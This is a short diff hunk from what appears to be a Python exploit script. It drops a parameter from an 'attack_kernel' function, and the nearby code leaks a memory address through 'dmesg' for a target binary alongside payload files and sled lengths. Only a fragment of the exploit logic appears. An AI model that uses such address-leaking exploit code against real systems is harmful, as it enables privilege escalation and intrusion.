@@ -177,7 +177,7 @@ def attack_userspace(target_binary, payload_file, sled_length):
     leaker.shutdown()
     print(leaker.recvall().decode('utf-8'))
 
-def attack_kernel(target_binary, payload_file, sled_length, adjuster):
+def attack_kernel(target_binary, payload_file, sled_length):
     leak, leaker = leaked(['dmesg', '--color=never'], target_binary)
     leaker.shutdown()
     print('Leaked address is', str(hex(leak)))
